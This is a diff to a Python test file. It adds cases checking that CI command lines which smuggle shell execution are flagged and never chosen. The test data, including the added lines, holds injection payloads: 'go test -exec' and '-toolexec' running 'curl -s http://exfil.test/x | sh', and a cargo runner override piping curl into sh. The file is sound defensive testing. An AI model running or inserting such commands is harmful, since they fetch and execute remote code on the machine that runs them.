@@ -303,6 +303,8 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "go test -exec \"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
         "cargo test --config \"target.x86_64-unknown-linux-gnu.runner='sh -c curl|sh'\"",
         "deno eval \"await new Deno.Command('sh').output(); test()\"",
+        "go test -exec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
+        "go test -toolexec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
     ],
     ids=[
         "a-bash-script",
@@ -328,6 +330,8 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "go-test-exec",
         "cargo-test-config",
         "deno-eval",
+        "go-test-exec-equals",
+        "go-test-toolexec-equals",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
